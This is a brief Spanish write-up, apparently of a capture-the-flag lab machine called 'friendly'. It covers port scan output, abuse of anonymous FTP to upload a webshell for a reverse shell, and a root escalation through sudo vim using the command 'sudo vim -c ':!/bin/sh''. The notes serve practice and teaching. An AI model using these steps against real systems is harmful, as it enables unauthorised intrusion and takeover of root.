PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

-FTP anonymous login está habilitado

-Nos conectamos y vemos un archivo index.html, por lo que podemos subir una webshell y mandarnos una rs desde la URL

www-data@friendly:/

## Escalada de Privilegios

-sudo -l:
	(ALL : ALL) NOPASSWD: /usr/bin/vim

-Gtfobins:
	-sudo vim -c ':!/bin/sh'
		root@friendly:/# whoami
		root